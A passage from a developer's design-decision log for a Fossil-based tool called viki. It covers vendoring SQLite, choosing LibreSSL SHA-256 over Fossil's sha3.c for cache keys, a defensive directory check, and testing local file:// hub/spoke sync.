`-DSQLITE_HAS_CODEC`) into a separate `sqlite3.o` for viki. One vendored
copy, two independent compiles -- no new dependency, no drift risk between
"the SQLite viki uses" and "the SQLite fossil-see uses" (same amalgamation
source, same pinned commit).

## Fossil's own `sha3.c` is too coupled to Fossil internals to reuse cleanly

**Date:** 2026-08-13.

Considered reusing `vendor/fossil-see/vendor/fossil/src/sha3.c` for viki's
`content_hash` keying (it's already vendored transitively, avoiding a new
dependency). Rejected: its public API (`sha3sum_init`/`_step_blob`/
`_finish`) takes Fossil's internal `Blob` type and depends on `config.h`
and other Fossil-internal machinery -- pulling it in would mean vendoring
a slice of Fossil's runtime, not just a hash function.

**Used instead:** LibreSSL's `EVP_Digest(..., EVP_sha256(), ...)` --
already linked in via `vendor/fossil-see/vendor/libressl-build-out`
(needed for TLS + SQLCipher regardless), so this adds no new dependency
either, and matches how `pizza-party-vote-fossil`'s `ppv-crypto` module
uses LibreSSL EVP rather than vendoring its own hash implementation. Note
this means viki's `content_hash` is plain SHA-256, *not* the same hash
Fossil uses for its own artifact hashes (SHA1/SHA3) -- deliberately: it's
purely an internal cache key, never compared against or exposed as a
Fossil artifact hash.

## `fossil uv export` appears to create its output file's parent directory

**Date:** 2026-08-13, testing `viki cache pull`.

`viki_cmd_cache_pull` (before a later fix) called `fossil uv export
viki-cache.db .viki/cache.db` without first ensuring `.viki/` existed, and
it worked anyway on a fresh clone where `.viki/` had never been created.
Not confirmed against fossil's source as an intentional guarantee --
`ensure_viki_dir()` is now called defensively before both `cache push` and
`cache pull` in `viki.c` regardless, rather than relying on this observed-
but-unverified behavior.

## Verified: the full hub/spoke/fresh-clone `fossil uv` loop, entirely with local `file://` repos, no server process needed

**Date:** 2026-08-13.

For testing, spun up `fossil-see init hub.fossil`, cloned it locally
(`fossil-see clone hub.fossil spoke.fossil` -- plain filesystem paths, no
`fossil server` process running anywhere), and confirmed `fossil uv sync`
happily syncs over the resulting `file:///...` remote URL that `fossil
clone` records automatically. This makes local hub/spoke UV-sync testing
fast and CI-friendly -- no need to stand up an actual HTTP server to
exercise this path in tests.
